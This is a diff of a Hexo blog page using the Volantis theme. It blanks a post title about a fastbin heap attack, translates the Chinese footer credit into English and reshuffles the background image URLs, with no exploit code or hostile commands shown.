@@ -621,8 +584,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=true;
-  pdata.postTitle="Fastbin attack (Babyheap)";
+  pdata.ispage=false;
+  pdata.postTitle="";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
@@ -672,9 +635,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
-        作为主题
+        as theme
       
     
       
@@ -885,7 +848,7 @@ var loadCSS = function( href, before, media, attributes ){
 <script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
 
     <script type="text/javascript">
-        var imgs=["https://z3.ax1x.com/2021/03/23/67RZrQ.png", "https://z3.ax1x.com/2021/03/23/67RVKg.png", "https://z3.ax1x.com/2021/03/23/67RAxS.png", "https://z3.ax1x.com/2021/03/23/672XvD.jpg", "https://z3.ax1x.com/2021/03/23/672OgO.jpg", "https://z3.ax1x.com/2021/03/23/672L8K.jpg", "https://z3.ax1x.com/2021/03/23/672qC6.jpg", "https://z3.ax1x.com/2021/03/23/672H4x.jpg", "https://z3.ax1x.com/2021/03/23/672Ib9.jpg", "https://z3.ax1x.com/2021/03/23/672TER.jpg"];
+        var imgs=["https://z3.ax1x.com/2021/03/23/672qC6.jpg", "https://z3.ax1x.com/2021/03/23/67RAxS.png", "https://z3.ax1x.com/2021/03/23/672TER.jpg", "https://z3.ax1x.com/2021/03/23/67RVKg.png", "https://z3.ax1x.com/2021/03/23/67RZrQ.png", "https://z3.ax1x.com/2021/03/23/672H4x.jpg", "https://z3.ax1x.com/2021/03/23/672XvD.jpg"];
         if ('true' == 'true') {
           function shuffle(arr){
             /*From countercurrent-time*/
